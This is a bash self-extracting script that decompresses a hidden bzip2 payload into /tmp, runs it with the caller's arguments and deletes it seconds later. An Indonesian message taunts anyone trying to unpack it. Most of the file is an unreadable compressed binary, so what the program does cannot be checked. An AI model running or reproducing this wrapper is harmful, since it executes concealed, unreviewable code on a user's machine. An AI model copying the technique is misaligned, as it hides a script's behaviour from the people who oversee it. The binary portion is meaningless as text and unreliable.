#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY"L�V  ���g�� ����������@D@  � �[ڻvγ0PC(MFS��OH�L���h4b4 �z �@RF�"x�=h�dhi�  @ 2  ��(И�4i�Cj1C&F����hFi�LA�  �h4��� �Ѧ@@� � ���S�d)�?E?IPѰ��M4�� ѓ�4��RA�\�뽖܌��+)��b��^	��?1�b���c"a1�Z���@��Fn|�_Es}$w���hD���&��B��%m:JR����_0&@�b#�N�E���CLϢ��m��͎��n�������EГ �S���d��a�!t�rR�YMxUV�:�å��ӭM�f4t�2z'-f��+d}��Z�0e.��[��ft�;bS��P�C���`�A!~$�����O�!���xX]�	�`�V3ԑ�6�X�΂��j�<k&E.�ĖQ����y���-&n�,�6�*T	1�	fO̤T�x~��a���/��)-����x��"zΘ�)*X��ԁH(]ܩA�|�:�N�	g�;�ɎMc�W4�`�1*�Fn�5D���o�zi.�b�\b���!m�kwqϐrz�ࠍ�@�˵J�m�@��Oq���R������f �z���\�Z��n��d��� ��+�:$��-X5i�X� 7N �S�XAR@H��P�H7��iG�<S!�Y�lV��
@L]x~��mu�|�5�%�<N{י�W�Y���`�f����?��(�+W`���(+uU���ݮ}��ζج�,LÝ�ش�X�(ڴ�6�w��n(9�c��/�h��dI��
�W+��-��&=&0��E.l�AR��!�`d7�l��L{��XB��I���c+(����処��.tǥ�v��G��$E�����r��oT�T�Rs�O�Q#^�5������4�x_Q+�_#3��-���M����3�{�38ɸ�̊ǑƷ���	���p�A��H\k2nV��艄a���i�AvTa�[!�jH�i����P�Q�:F"
j�^r��/�t��Qr"B�����p�HR	m
')Q��6����/i�qfz�XԐq����	!�$��z�Z�+��a2b�8� E�Gp�+��"�(H&\+ 